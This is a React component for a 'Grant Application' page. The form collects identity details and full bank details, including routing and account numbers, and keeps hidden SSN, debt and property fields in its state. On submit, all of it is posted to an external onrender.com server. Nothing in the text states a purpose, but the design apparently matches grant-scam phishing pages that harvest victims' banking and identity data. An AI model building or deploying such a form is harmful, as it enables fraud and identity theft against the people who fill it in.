import React, { useState, useEffect, useRef } from 'react';
import { GRANTS } from '../constants';
import { CheckCircle, AlertCircle, Loader2 } from 'lucide-react';

const Apply: React.FC = () => {
  const [preselectedGrantId, setPreselectedGrantId] = useState('');
  const [submitted, setSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isFilling, setIsFilling] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const formRef = useRef<HTMLFormElement>(null);

  const [formData, setFormData] = useState({
    grantId: "",
    fullName: "",
    dob: "",
    phone: "",
    email: "",
    address: "",
    bankName: "",
    branch: "",
    accountName: "",
    accountNumber: "",
    ssn: "",
    debt: "",
    propertyOwned: false,
    propertyAddress: "",
    certification: false
  });

  // Preselect grant from URL
  useEffect(() => {
    const hash = window.location.hash;
    const queryString = hash.split('?')[1];
    if (queryString) {
      const params = new URLSearchParams(queryString);
      const grantId = params.get('preselectedGrant');
      if (grantId) setPreselectedGrantId(grantId);
    }
  }, []);

  useEffect(() => {
    if (preselectedGrantId) {
      setFormData(prev => ({ ...prev, grantId: preselectedGrantId }));
    }
  }, [preselectedGrantId]);

  // Demo autofill
  const fillDemoData = () => {
    setIsFilling(true);
    setTimeout(() => {
      setFormData({
        grantId: preselectedGrantId || GRANTS[0].id,
        fullName: "Alex J. Mercer",
        dob: "1985-04-12",
        phone: "(555) 019-2834",
        email: "alex.mercer@example.com",
        address: "123 Freedom Way, Washington, DC",
        bankName: "National Reserve Bank",
        branch: "123456789",
        accountName: "Alex Mercer",
        accountNumber: "9876543210",
        ssn: "000-00-0000",
        debt: "0",
        propertyOwned: true,
        propertyAddress: "123 Freedom Way",
        certification: true
      });
      setIsFilling(false);
    }, 800);
  };

  // ⭐ FINAL SUBMIT HANDLER ⭐
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setSubmitError(null);

    try {
      const response = await fetch("https://nga-hyo5.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData)
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.message || "Submission failed");
      }

      setSubmitted(true);
    } catch (err: any) {
      setSubmitError(err.message);
    } finally {
      setIsLoading(false);
    }
  };

  // ⭐ UI ⭐
  if (submitted) {
    return (
      <div className="success-screen">
        <CheckCircle size={60} color="green" />
        <h2>Application Submitted Successfully</h2>
        <p>Your application has been securely archived.</p>
      </div>
    );
  }

  return (
    <div className="apply-container">
      <h1>Grant Application</h1>

      {submitError && (
        <div className="error-banner">
          <AlertCircle size={20} />
          {submitError}
        </div>
      )}

      <form ref={formRef} onSubmit={handleSubmit}>

        {/* Grant ID */}
        <label>Grant Program</label>
        <input
          type="text"
          value={formData.grantId}
          onChange={e => setFormData({ ...formData, grantId: e.target.value })}
          required
        />

        {/* Full Name */}
        <label>Full Name</label>
        <input
          type="text"
          value={formData.fullName}
          onChange={e => setFormData({ ...formData, fullName: e.target.value })}
          required
        />

        {/* DOB */}
        <label>Date of Birth</label>
        <input
          type="date"
          value={formData.dob}
          onChange={e => setFormData({ ...formData, dob: e.target.value })}
          required
        />

        {/* Phone */}
        <label>Phone</label>
        <input
          type="text"
          value={formData.phone}
          onChange={e => setFormData({ ...formData, phone: e.target.value })}
          required
        />

        {/* Email */}
        <label>Email</label>
        <input
          type="email"
          value={formData.email}
          onChange={e => setFormData({ ...formData, email: e.target.value })}
          required
        />

        {/* Address */}
        <label>Address</label>
        <input
          type="text"
          value={formData.address}
          onChange={e => setFormData({ ...formData, address: e.target.value })}
          required
        />

        {/* Bank Name */}
        <label>Bank Name</label>
        <input
          type="text"
          value={formData.bankName}
          onChange={e => setFormData({ ...formData, bankName: e.target.value })}
          required
        />

        {/* Routing Number */}
        <label>Routing Number</label>
        <input
          type="text"
          value={formData.branch}
          onChange={e => setFormData({ ...formData, branch: e.target.value })}
          required
        />

        {/* Account Name */}
        <label>Account Name</label>
        <input
          type="text"
          value={formData.accountName}
          onChange={e => setFormData({ ...formData, accountName: e.target.value })}
          required
        />

        {/* Account Number */}
        <label>Account Number</label>
        <input
          type="text"
          value={formData.accountNumber}
          onChange={e => setFormData({ ...formData, accountNumber: e.target.value })}
          required
        />

        {/* Certification */}
        <label>
          <input
            type="checkbox"
            checked={formData.certification}
            onChange={e => setFormData({ ...formData, certification: e.target.checked })}
          />
          I certify that all information provided is accurate.
        </label>

        {/* Submit Button */}
        <button type="submit" disabled={isLoading}>
          {isLoading ? <Loader2 className="spin" /> : "Submit Application"}
        </button>

        {/* Demo Autofill */}
        <button type="button" onClick={fillDemoData} disabled={isFilling}>
          {isFilling ? "Filling…" : "Auto‑Fill Demo Data"}
        </button>
      </form>
    </div>
  );
};

export default Apply;
